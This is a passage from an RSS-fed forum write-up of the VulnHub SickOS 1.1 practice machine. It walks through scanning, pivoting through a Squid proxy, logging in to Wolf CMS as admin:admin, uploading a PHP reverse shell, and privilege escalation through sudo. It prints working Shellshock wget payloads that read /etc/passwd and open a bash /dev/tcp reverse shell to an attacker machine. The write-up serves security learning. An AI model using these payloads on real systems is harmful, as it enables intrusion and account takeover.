+<ul>
+<li>Squid Proxy misconfiguration</li>
+<li>Shellshock bug</li>
+<li>Wolf CMS 0.8.2 admin weak password</li>
+<li>Sensitivie information disclosure</li>
+<li>Local priv escape by misconfigured sudo list</li>
+</ul>
+<h4>Host Discovery</h4>
+<p>Because all VulnHub VM comes with random DHCP IP address for the machines, we need to identify the IP address from the VM first. In this section, we can use several methods for discovering the host.</p>
+<p>I’m using VMware for hosting the machines, but I don’t know why VMware is not showing as Vendor name in arp-scan, netdiscover or nmap. It only shows as Unknown or Intel corporate. Because of only 3 machines connected to wifi, it’s easy to determine which one is the VM.</p>
+<p>Okay, try to discover the host using 3 methods with root privilege.</p>
+<p><strong>Arp-Scan</strong></p>
+<pre><code class="lang-auto">↳ arp-scan -l
+Interface: wlp2s0, datalink type: EN10MB (Ethernet)
+Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
+192.168.43.1    xx:xx:xx:xx:xx:xx       (Unknown) &lt;--- Routers
+192.168.43.202  xx:xx:xx:xx:xx:xx       (Unknown) &lt;--- VulnHub VM, MAC address is same as host
+</code></pre>
+<p><strong>Netdiscover</strong></p>
+<pre><code class="lang-auto">↳ netdiscover -r 192.168.43.0/24
+ Currently scanning: Finished!   |   Our Mac is: xx:xx:xx:xx:xx:xx - 0        
+ 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 126                               
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 192.168.43.1    xx:xx:xx:xx:xx:xx    01    042   Unknown vendor        
+</code></pre>
+<p><strong>Nmap</strong></p>
+<pre><code class="lang-auto">↳ nmap -sn 192.168.43.0/24
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-23 20:35 WIB
+Nmap scan report for 192.168.43.1
+Host is up (0.0045s latency).
+MAC Address: xx:xx:xx:xx:xx:xx (Asustek Computer)
+Nmap scan report for 192.168.43.202
+Host is up (0.00023s latency).
+MAC Address: xx:xx:xx:xx:xx:xx (Intel Corporate) &lt;--- This is our target
+Nmap scan report for 192.168.43.229
+Host is up (0.14s latency).
+MAC Address: xx:xx:xx:xx:xx:xx (Apple)
+Nmap scan report for 192.168.43.94
+Host is up.
+Nmap scan report for 192.168.43.95
+Host is up.
+Nmap done: 256 IP addresses (5 hosts up) scanned in 9.05 seconds
+</code></pre>
+<p>Nah, we have our target IP 192.168.43.202(censored MAC address). As always, we can use nmap to scan and enum open port for the machine.</p>
+<p><strong>Port scanning and enumeration</strong></p>
+<pre><code class="lang-auto">↳ nmap -p- -T5 -A -sT -Pn 192.168.43.202   
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-23 20:39 WIB
+Nmap scan report for 192.168.43.202
+Host is up (0.00052s latency).
+Not shown: 65532 filtered ports
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
+|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
+|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
+3128/tcp open   http-proxy Squid http proxy 3.1.19
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported: GET HEAD
+|_http-server-header: squid/3.1.19
+|_http-title: ERROR: The requested URL could not be retrieved
+8080/tcp closed http-proxy
+MAC Address: xx:xx:xx:xx:xx:xx (Intel Corporate)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>From the above results, we know that nmap tell us port 22 and 3128 is open. While port 8080 state is closed, it’s so weird if open port just ssh and squid proxy. What’s interesting is port 3128 for Squid Proxy. After hours of searching, I get this explanation from rapid7 and from other write-up for SickOS. As <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning" rel="noopener nofollow ugc">rapid7</a> explanation:</p>
+<blockquote>
+<p>A misconfigured Squid proxy can allow an attacker to make requests on his behalf. This may give the attacker information about devices that he cannot reach but the Squid proxy can. For example, an attacker can make requests for internal IP addresses against a misconfigured open Squid proxy exposed to the Internet, therefore performing an internal port scan. The error messages returned by the proxy are used to determine if the port is open or not. Many Squid proxies use custom error codes so your mileage may vary. The open_proxy module can be used to test for open proxies, though a Squid proxy does not have to be open in order to allow for pivoting (e.g. an Intranet Squid proxy which allows the attack to pivot to another part of the network).</p>
+</blockquote>
+<p>I don’t want to use metasploit built-in <code>auxiliary/scanner/http/squid_pivot_scanning</code> for this. So I’m building my own tools(after understanding the attack flow) for checking open port behind misconfigured squid proxy. You can use my tool for this purpose, just clone and run it:</p>
+<p>Spose - Squid Pivoting Open Port Scanner : <a href="http://github.com/aancw/spose" rel="noopener nofollow ugc">http://github.com/aancw/spose</a></p>
+<p><strong>Scan with proxy</strong></p>
+<pre><code class="lang-auto">↳ python spose.py --proxy http://192.168.43.202:3128 --target 192.168.43.202
+Using proxy address http://192.168.43.202:3128
+192.168.43.202 22 seems OPEN 
+192.168.43.202 80 seems OPEN 
+</code></pre>
+<p>Gotcha! from spose we know that port 80 is open behind squid proxy.</p>
+<p><strong>cURL</strong></p>
+<pre><code class="lang-auto">↳ curl -kv -x http://192.168.43.202:3128 http://192.168.43.202
+*   Trying 192.168.43.202...
+* TCP_NODELAY set
+* Connected to 192.168.43.202 (192.168.43.202) port 3128 (#0)
+&gt; GET http://192.168.43.202/ HTTP/1.1
+&gt; Host: 192.168.43.202
+&gt; User-Agent: curl/7.62.0
+&gt; Accept: */*
+&gt; Proxy-Connection: Keep-Alive
+&gt; 
+* HTTP 1.0, assume close after body
+&lt; HTTP/1.0 200 OK
+&lt; Date: Sun, 23 Dec 2018 15:59:53 GMT
+&lt; Server: Apache/2.2.22 (Ubuntu)
+&lt; X-Powered-By: PHP/5.3.10-1ubuntu3.21
+&lt; Vary: Accept-Encoding
+&lt; Content-Length: 21
+&lt; Content-Type: text/html
+&lt; X-Cache: MISS from localhost
+&lt; X-Cache-Lookup: MISS from localhost:3128
+&lt; Via: 1.0 localhost (squid/3.1.19)
+* HTTP/1.0 connection set to keep alive!
+&lt; Connection: keep-alive
+&lt; 
+&lt;h1&gt;
+BLEHHH!!!
+&lt;/h1&gt;
+* Connection #0 to host 192.168.43.202 left intact
+</code></pre>
+<p>Hm something weird with only “BLEHH” output. Trying to scan with nikto then.</p>
+<p><strong>Nikto</strong></p>
+<pre><code class="lang-auto">↳ nikto -h 192.168.43.202 -useproxy http://192.168.43.202:3128
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.43.202
++ Target Hostname:    192.168.43.202
++ Target Port:        80
++ Proxy:              192.168.43.202:3128
++ Start Time:         2018-12-23 23:02:04 (GMT7)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Ubuntu)
++ Retrieved via header: 1.0 localhost (squid/3.1.19)
++ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'x-cache-lookup' found, with contents: MISS from localhost:3128
++ Uncommon header 'x-cache' found, with contents: MISS from localhost
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Server leaks inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Sat Dec  5 07:35:02 2015
++ Server banner has changed from 'Apache/2.2.22 (Ubuntu)' to 'squid/3.1.19' which may suggest a WAF, load balancer or proxy is in place
++ Uncommon header 'x-squid-error' found, with contents: ERR_INVALID_REQ 0
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
++ Uncommon header 'nikto-added-cve-2014-6271' found, with contents: true
++ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
++ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8347 requests: 0 error(s) and 21 item(s) reported on remote host
++ End Time:           2018-12-23 23:02:17 (GMT7) (13 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre>
+<p>From nikto result, the web server is vulnerable to shellsock vulnerability. Good news for us!</p>
+<p><strong>dirb</strong></p>
+<p>Using dirb for simple directory searching and found this endpoints.</p>
+<pre><code class="lang-auto">↳ dirb http://192.168.43.202 -p 192.168.43.202:3128
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Dec 23 23:03:37 2018
+URL_BASE: http://192.168.43.202/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+PROXY: 192.168.43.202:3128
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.43.202/ ----
++ http://192.168.43.202/cgi-bin/ (CODE:403|SIZE:290)                            
++ http://192.168.43.202/connect (CODE:200|SIZE:109)                               
++ http://192.168.43.202/index (CODE:200|SIZE:21)                                  
++ http://192.168.43.202/index.php (CODE:200|SIZE:21)                                           
++ http://192.168.43.202/robots (CODE:200|SIZE:45)                                               
++ http://192.168.43.202/robots.txt (CODE:200|SIZE:45)                                           
++ http://192.168.43.202/server-status (CODE:403|SIZE:295)                                                                                                           
+-----------------
+END_TIME: Sun Dec 23 23:03:40 2018
+DOWNLOADED: 4612 - FOUND: 7
+</code></pre>
+<p>Checking for robots.txt and it telling us that the web server is hosted wolfcms.</p>
+<pre><code class="lang-auto">User-agent: *
+Disallow: /
+Dissalow: /wolfcms
+</code></pre>
+<p>From the informations we get before, we can summarize the vulnerability by 2 attack vector.</p>
+<ul>
+<li>Exploiting Machine with Shellsock</li>
+<li>Finding Wolfcms Vuln</li>
+</ul>
+<p>As far I know, the above attack vector is resulting reverse shell for connection when success. So we can listen for incoming reverse shell connection with netcat:</p>
+<pre><code class="lang-auto">↳ nc -lvp 4443
+Listening on [0.0.0.0] (family 0, port 4443)
+</code></pre>
+<p><strong>WolfCMS Attack Vector</strong></p>
+<p>Using wolfcms as attack vector for getting root shell with wolfcms 0.8.2 vulnerability. I’ve found that in this version is affected by Arbitrary File Upload vuln as mentioned in <a href="https://www.exploit-db.com/exploits/36818" rel="noopener nofollow ugc">Exploit-DB</a>. But, we need a valid credential/session for uploading reverse shell or backdoor for login credential. Trying to use a common weak password like admin:admin, admin:password and other for the login at <a href="http://192.168.43.202/wolfcms/?/admin/login" rel="noopener nofollow ugc">http://192.168.43.202/wolfcms/?/admin/login</a><br>
+<img src="https://0x00sec.s3.amazonaws.com/original/2X/1/18c327055e9654fe140676e828cb826f4490878c.png" alt="wolfcms-login" data-base62-sha1="3x3zqAPZLXWlvTgb67Ai5ugPVjC" width="690" height="209"></p>
+<p>Input admin:admin for the credential and then it redirected us to administration dashboard. Good news!</p>
+<p>So, what’s next?</p>
+<p>After logging in to administrator dashboard, we can upload PHP reverse shell in file manager feature.<br>
+<img src="https://0x00sec.s3.amazonaws.com/original/2X/6/69134f125374cd8a6909bd2708a98598f05ace3a.png" alt="wolfcms-upload-file" data-base62-sha1="eZxvdkq8sKGGEYz7O9GNm6Aq1ey" width="689" height="338"></p>
+<p>Nah, we can upload the file in <code>public/images</code> directory or in <code>public</code> directory. For simple php reverse shell, you can download from <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" rel="noopener nofollow ugc">PentestMonkey.net</a> and change the file with IP and port for the reverse shell as I mentioned above.</p>
+<pre><code class="lang-auto">$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+</code></pre>
+<p>Upload the file, access it(<a href="http://192.168.43.202/wolfcms/public/reverse.php" rel="noopener nofollow ugc">http://192.168.43.202/wolfcms/public/reverse.php</a>) and see an incoming connection in netcat listening session:</p>
+<pre><code class="lang-auto">↳ nc -lvp 4443
+Listening on [0.0.0.0] (family 0, port 4443)
+Connection from 192.168.43.202 56724 received!
+Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
+ 15:38:55 up 24 min,  0 users,  load average: 0.00, 0.01, 0.03
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+</code></pre>
+<p>Gotcha! We have a reverse shell from our backdoor. Next, exploiting shellsock vulnerability.</p>
+<p><strong>Shellsock Attack Vector</strong></p>
+<p>We will use this attack vector for rooting the machine. If you are don’t know about shellsock, you can read the explanation from <a href="https://coderwall.com/p/5db5eg/understanding-the-shellshock-vulnerability" rel="noopener nofollow ugc">coderwall</a></p>
+<blockquote>
+<p>The <strong>Shellshock</strong> vulnerability, also know as <strong>CVE-2014-6271</strong> , allows attackers to inject their own code into <a href="http://www.gnu.org/software/bash/" rel="noopener nofollow ugc">Bash</a> using specially crafted <strong>environment variables</strong></p>
+</blockquote>
+<p>From nikto scan result, we know that affected endpoint is <code>cgi-bin/status</code> . So, we need to test this by sending a malicious crafted request with wget, curl or other tools. For simple Proof, we are sending a request to the affected endpoint with <code>cat /etc/passwd</code> for showing <code>/etc/passwd</code> content.</p>
+<pre><code class="lang-auto">↳ wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=yes -e http_proxy=192.168.43.202:3128 http://192.168.43.202/cgi-bin/status
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+whoopsie:x:103:106::/nonexistent:/bin/false
+landscape:x:104:109::/var/lib/landscape:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
+mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre>
+<p>Aha~ our request is accepted and it shows us the content of <code>etc/passwd</code> file.</p>
+<p>Now, we can make reverse shell connection with this vuln like PHP reverse shell before. Doing simple reverse shell with <code>/bin/bash -i &gt;&amp; /dev/tcp/attacker_ip/attacker_port 0&gt;&amp;1</code></p>
+<pre><code class="lang-auto">↳ wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/bash -i &gt;&amp; /dev/tcp/192.168.43.94/4443 0&gt;&amp;1" -e use_proxy=yes -e http_proxy=192.168.43.202:3128 http://192.168.43.202/cgi-bin/status
+</code></pre>
+<p>Uhuuu reverse shell again!</p>
+<pre><code class="lang-auto">↳ nc -lvp 4443
+Listening on [0.0.0.0] (family 0, port 4443)
+Connection from 192.168.43.202 44354 received!
+bash: no job control in this shell
+www-data@SickOs:/usr/lib/cgi-bin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@SickOs:/usr/lib/cgi-bin$ 
+</code></pre>
+<p><strong>Post Exploitation</strong></p>
+<p>In this section, we are going to escalating privilege from www-data to root privilege because the flag in the root directory as mentioned in instruction:</p>
+<pre><code class="lang-auto">Get /root/a0216ea4d51874464078c618298b1367.txt
+</code></pre>
+<p>Searching for interesting file and credential in <code>/var/www/</code> .</p>
+<pre><code class="lang-auto">www-data@SickOs:/var/www$ cd /var/www
+cd /var/www
+www-data@SickOs:/var/www$ ls -lah
+ls -lah
+total 24K
+drwxrwxrwx  3 root root 4.0K Dec  6  2015 .
+drwxr-xr-x 13 root root 4.0K Dec  6  2015 ..
+-rwxrwxrwx  1 root root  109 Dec  5  2015 connect.py
+-rw-r--r--  1 root root   21 Dec  5  2015 index.php
+-rw-r--r--  1 root root   45 Dec  5  2015 robots.txt
+drwxr-xr-x  5 root root 4.0K Dec  5  2015 wolfcms
+www-data@SickOs:/var/www$ 
+</code></pre>
+<pre><code class="lang-auto">www-data@SickOs:/var/www$ cd wolfcms
+cd wolfcms
+www-data@SickOs:/var/www/wolfcms$ ls -lah
+ls -lah
+total 52K
+drwxr-xr-x 5 root root 4.0K Dec  5  2015 .
+drwxrwxrwx 3 root root 4.0K Dec  6  2015 ..
+-rwxr-xr-x 1 root root  950 Dec  5  2015 .htaccess
+-rwxrwxrwx 1 root root 4.0K Dec  5  2015 CONTRIBUTING.md
+-rwxrwxrwx 1 root root 2.4K Dec  5  2015 README.md
+-rwxrwxrwx 1 root root  403 Dec  5  2015 composer.json
+-rwxrwxrwx 1 root root 3.0K Dec  5  2015 config.php
+drwxrwxrwx 2 root root 4.0K Dec  5  2015 docs
+-rwxrwxrwx 1 root root  894 Dec  5  2015 favicon.ico
+-rwxrwxrwx 1 root root 6.7K Dec  5  2015 index.php
+drwxrwxrwx 4 root root 4.0K Dec  6  2015 public
+-rwxrwxrwx 1 root root    0 Dec  5  2015 robots.txt
+drwxrwxrwx 7 root root 4.0K Dec  5  2015 wolf
+www-data@SickOs:/var/www/wolfcms$ 
+</code></pre>
+<p>Trying to read wolfcms <code>config.php</code> and it showing us database connection for the website.</p>
+<pre><code class="lang-auto">www-data@SickOs:/var/www/wolfcms$ cat config.php
+cat config.php
+&lt;?php 
+
+// Database information:
+// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
+// The path can only be absolute path or :memory:
+// For more info look at: www.php.net/pdo
+
+// Database settings:
+define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
+define('DB_USER', 'root');
+define('DB_PASS', 'john@123');
+define('TABLE_PREFIX', '');
+
+// Should Wolf produce PHP error messages for debugging?
+define('DEBUG', false);
+
+// Should Wolf check for updates on Wolf itself and the installed plugins?
+define('CHECK_UPDATES', true);
+
+// The number of seconds before the check for a new Wolf version times out in case of problems.
+define('CHECK_TIMEOUT', 3);
+
+// The full URL of your Wolf CMS install
+define('URL_PUBLIC', '/wolfcms/');
+
+// Use httpS for the backend?
+// Before enabling this, please make sure you have a working HTTP+SSL installation.
+define('USE_HTTPS', false);
+
+// Use HTTP ONLY setting for the Wolf CMS authentication cookie?
+// This requests browsers to make the cookie only available through HTTP, so not javascript for example.
+// Defaults to false for backwards compatibility.
+define('COOKIE_HTTP_ONLY', false);
+
+// The virtual directory name for your Wolf CMS administration section.
+define('ADMIN_DIR', 'admin');
+
+// Change this setting to enable mod_rewrite. Set to "true" to remove the "?" in the URL.
+// To enable mod_rewrite, you must also change the name of "_.htaccess" in your
+// Wolf CMS root directory to ".htaccess"
+define('USE_MOD_REWRITE', false);
+
+// Add a suffix to pages (simluating static pages '.html')
+define('URL_SUFFIX', '.html');
+
+// Set the timezone of your choice.
+// Go here for more information on the available timezones:
+// http://php.net/timezones
+define('DEFAULT_TIMEZONE', 'Asia/Calcutta');
+
+// Use poormans cron solution instead of real one.
+// Only use if cron is truly not available, this works better in terms of timing
+// if you have a lot of traffic.
+define('USE_POORMANSCRON', false);
+
+// Rough interval in seconds at which poormans cron should trigger.
+// No traffic == no poormans cron run.
+define('POORMANSCRON_INTERVAL', 3600);
+
+// How long should the browser remember logged in user?
+// This relates to Login screen "Remember me for xxx time" checkbox at Backend Login screen
+// Default: 1800 (30 minutes)
+define ('COOKIE_LIFE', 1800);  // 30 minutes
+
+// Can registered users login to backend using their email address?
+// Default: false
+define ('ALLOW_LOGIN_WITH_EMAIL', false);
+
+// Should Wolf CMS block login ability on invalid password provided?
+// Default: true
+define ('DELAY_ON_INVALID_LOGIN', true);
+
+// How long should the login blockade last?
+// Default: 30 seconds
+define ('DELAY_ONCE_EVERY', 30); // 30 seconds
+
+// First delay starts after Nth failed login attempt
+// Default: 3
+define ('DELAY_FIRST_AFTER', 3);
+
+// Secure token expiry time (prevents CSRF attacks, etc.)
+// If backend user does nothing for this time (eg. click some link) 
+// his token will expire with appropriate notification
+// Default: 900 (15 minutes)
+define ('SECURE_TOKEN_EXPIRY', 900);  // 15 minutes
+</code></pre>
+<p>From <code>/etc/passwd/</code> we know that <strong>sickos</strong> user exists in this machine. Trying to su with a credential from the database connection.</p>
+<pre><code class="lang-auto">www-data@SickOs:/usr/lib/cgi-bin$ su sickos
+su sickos
+su: must be run from a terminal
+www-data@SickOs:/usr/lib/cgi-bin$ python -c 'import pty; pty.spawn("/bin/bash")'
+&lt;i-bin$ python -c 'import pty; pty.spawn("/bin/bash")'                       
+www-data@SickOs:/usr/lib/cgi-bin$ su sickos
+su sickos
+Password: john@123
+
+sickos@SickOs:/usr/lib/cgi-bin$ id
+id
+uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+</code></pre>
+<p>Hm… cannot doing su because we are not running from terminal, we need to spawn tty with bash session. After that, su again and it showing us id is changed to sickos from www-data.</p>
+<p>Escalating privilege with misconfigured <code>sudo</code> .</p>
+<pre><code class="lang-auto">sickos@SickOs:/usr/lib/cgi-bin$ sudo -l
+sudo -l
+[sudo] password for sickos: john@123
+
+Matching Defaults entries for sickos on this host:
+    env_reset,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sickos may run the following commands on this host:
+    (ALL : ALL) ALL
+sickos@SickOs:/usr/lib/cgi-bin$ sudo su
+sudo su
+root@SickOs:/usr/lib/cgi-bin# 
+</code></pre>
+<p>In the end, we can access flag file as mentioned in the instruction.</p>
+<pre><code class="lang-auto">root@SickOs:/usr/lib/cgi-bin# cd /root 
+cd /root
+root@SickOs:~# ls -lah
+ls -lah
+total 40K
+drwx------  3 root root 4.0K Dec  6  2015 .
+drwxr-xr-x 22 root root 4.0K Sep 22  2015 ..
+-rw-r--r--  1 root root   96 Dec  6  2015 redacted-hash.txt
+-rw-------  1 root root 3.7K Dec  6  2015 .bash_history
+-rw-r--r--  1 root root 3.1K Apr 19  2012 .bashrc
+drwx------  2 root root 4.0K Sep 22  2015 .cache
+-rw-------  1 root root   22 Dec  5  2015 .mysql_history
+-rw-r--r--  1 root root  140 Apr 19  2012 .profile
+-rw-------  1 root root 5.2K Dec  6  2015 .viminfo
+root@SickOs:~# cat redacted-hash.txt
+cat redacted-hash.txt
+If you are viewing this!!
+
+ROOT!
+
+You have Succesfully completed SickOS1.1.
+Thanks for Trying
+</code></pre>
+<p><strong>References</strong>:</p>
+<ul>
+<li><a href="https://g0blin.co.uk/sickos-1-1-vulnhub-writeup/" rel="noopener nofollow ugc">https://g0blin.co.uk/sickos-1-1-vulnhub-writeup/</a></li>
+<li><a href="https://www.alternativesec.xyz/vulnhub/2017/02/16/Sick-OS/" rel="noopener nofollow ugc">https://www.alternativesec.xyz/vulnhub/2017/02/16/Sick-OS/</a></li>
+<li><a href="http://f4l13n5n0w.github.io/blog/2015/12/24/vulnhub-sickos-1-dot-1/" rel="noopener nofollow ugc">http://f4l13n5n0w.github.io/blog/2015/12/24/vulnhub-sickos-1-dot-1/</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener nofollow ugc">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
+</ul>
+          <p><a href="https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799/1</link>
+        <pubDate>Sun, 07 Jul 2019 04:49:54 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-14799-1</guid>
+        <source url="https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799.rss">[VulnHub] SickOS 1.1 Writeup</source>
+      </item>
+  </channel>
+</rss>
